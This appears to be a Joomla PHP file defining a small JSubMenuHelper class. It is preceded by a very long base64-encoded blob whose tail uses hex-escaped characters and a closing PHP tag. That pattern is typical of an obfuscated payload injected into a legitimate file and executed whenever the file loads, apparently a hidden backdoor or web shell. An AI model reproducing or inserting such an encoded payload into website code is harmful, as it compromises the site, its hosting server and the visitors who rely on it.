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'\x29\x29\x20\x29\x20\x3b",".");?>
class JSubMenuHelper
{
	function addEntry($name, $link = '', $active = false)
	{
		$menu = &JToolBar::getInstance('submenu');
		$menu->appendButton($name, $link, $active);
	}
}
